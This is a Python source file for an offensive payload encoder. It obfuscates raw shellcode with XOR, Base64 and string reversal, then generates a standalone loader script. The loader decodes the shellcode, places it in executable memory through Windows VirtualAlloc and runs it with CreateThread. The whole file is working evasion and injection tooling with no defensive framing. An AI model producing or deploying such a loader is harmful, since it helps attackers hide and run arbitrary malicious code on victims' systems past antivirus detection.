# language: Python 3, file: payload_encoder.py, target: Windows/Linux
# Multi-layer payload encoder: XOR -> Base64 -> reverse. Generates standalone Python loader.
import base64
import os

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def encode(data: bytes, key: bytes) -> str:
    step1 = xor(data, key)          # XOR
    step2 = base64.b64encode(step1) # Base64
    step3 = step2[::-1]             # Reverse
    return step3.decode()

def make_loader(encoded: str, key: bytes, out_path: str) -> None:
    stub = f'''# Encoded payload loader
import base64

def _d(e, k):
    s1 = e[::-1]
    s2 = base64.b64decode(s1)
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(s2))

_k = {list(key)}
_e = {encoded!r}.encode()
_sc = _d(_e, _k)

import ctypes
buf = ctypes.create_string_buffer(_sc)
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(_sc), 0x3000, 0x40)
ctypes.memmove(ptr, buf, len(_sc))
th  = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(th, -1)
'''
    with open(out_path, 'w') as f:
        f.write(stub)

def main():
    payload_path = input('Payload/shellcode file (raw bytes): ').strip()
    key_hex = input('XOR key hex (ex: aabbccdd): ').strip()
    out_path = input('Output loader file (ex: loader.py): ').strip() or 'loader.py'
    with open(payload_path, 'rb') as f:
        data = f.read()
    key = bytes.fromhex(key_hex)
    encoded = encode(data, key)
    make_loader(encoded, key, out_path)
    print(f'[+] Encoded {len(data)} bytes')
    print(f'[+] Loader written to {out_path}')

if __name__ == '__main__':
    main()
